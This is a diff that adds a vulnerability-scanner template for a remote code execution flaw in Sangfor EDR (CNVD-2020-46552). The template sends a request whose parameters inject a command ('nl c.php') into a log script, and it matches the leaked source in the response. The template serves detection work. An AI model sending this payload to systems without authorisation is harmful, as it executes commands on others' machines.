@@ -1,0 +1,22 @@
+id: CNVD-2020-46552
+
+info:
+  name: Sangfor EDR - Remote Code Execution
+  author: ritikchaddha
+  severity: critical
+  tags: cnvd,cnvd2020,sangfor,rce
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/tool/log/c.php?strip_slashes=printf&host=nl+c.php"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "$show_input = function($info)")'
+          - 'contains(body, "$strip_slashes($host)")'
+          - 'contains(body, "Log Helper")'
+          - 'status_code == 200'
+        condition: and
+
